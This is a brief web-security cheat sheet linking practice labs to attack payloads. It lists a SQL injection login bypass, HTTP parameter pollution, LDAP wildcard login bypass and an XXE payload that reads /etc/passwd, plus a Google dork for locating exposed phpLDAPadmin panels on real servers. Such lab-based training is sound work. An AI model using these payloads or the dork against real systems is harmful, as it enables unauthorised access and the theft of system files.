# Cross Site Scripting (Reflected & Stored)
Lab : http://testphp.vulnweb.com/index.php

# HTTP Parameter Pollution
Lab : https://bwapp.hakhub.net/hpp-1.php
Payload : &movie=2

# SQL Injection
Lab : https://juice-shop.herokuapp.com/#/login
Payload : admin' or '1'='1'--

# HTTP Verb Tampering
Lab : http://challenge01.root-me.org/web-serveur/ch8/

# LDAP Injection

Google Dork - 
intitle:"phpLDAPadmin" inurl:cmd.php

Login Bypass - 
user=*
password=*
--> (&(user=*)(password=*))

# XML Injection
Lab : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
Payload : <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
